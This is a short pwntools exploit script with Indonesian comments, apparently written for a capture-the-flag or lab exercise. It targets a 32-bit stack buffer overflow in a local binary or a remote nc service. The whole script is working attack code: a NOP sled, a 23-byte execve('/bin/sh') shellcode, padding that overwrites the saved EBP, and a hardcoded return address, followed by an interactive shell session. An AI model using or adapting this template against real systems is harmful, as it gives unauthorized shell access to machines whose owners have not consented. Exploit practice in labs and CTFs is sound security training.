from pwn import *

# === KONFIGURASI ===
# Ganti dengan nama binary lokal kamu
exe = './vulnerable_program' 
elf = ELF(exe)
context.binary = elf

# Pilih mode: 'local' untuk testing di PC, 'remote' untuk NC ke server
mode = 'local' 

if mode == 'local':
    p = process(exe)
else:
    # Contoh: nc 10.10.10.10 1337
    p = remote('10.10.10.10', 1337)

# === DATA EXPLOIT (Berdasarkan Gambar) ===
# Perkiraan alamat stack (tengah-tengah NOP sled untuk toleransi ASLR)
target_addr = 0xbffff434 

# Shellcode execve("/bin/sh") 23 byte
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"

# Ukuran NOP sled
nop_size = 105
padding_ebp = 8 # Junk untuk menimpa Saved EBP dan alignment

# === SUSUN PAYLOAD ===
# Struktur: [NOP Sled] + [Shellcode] + [Padding EBP] + [Return Address]
payload = b"\x90" * nop_size
payload += shellcode
payload += b"A" * padding_ebp
payload += p32(target_addr) # Mengonversi alamat ke format Little-Endian 32-bit

# === EKSEKUSI ===
log.info(f"Mengirim payload (Total: {len(payload)} byte)...")

# Gunakan sendline jika program menggunakan gets() atau fgets()
p.sendline(payload)

# Masuk ke mode interaktif untuk kontrol shell
p.interactive()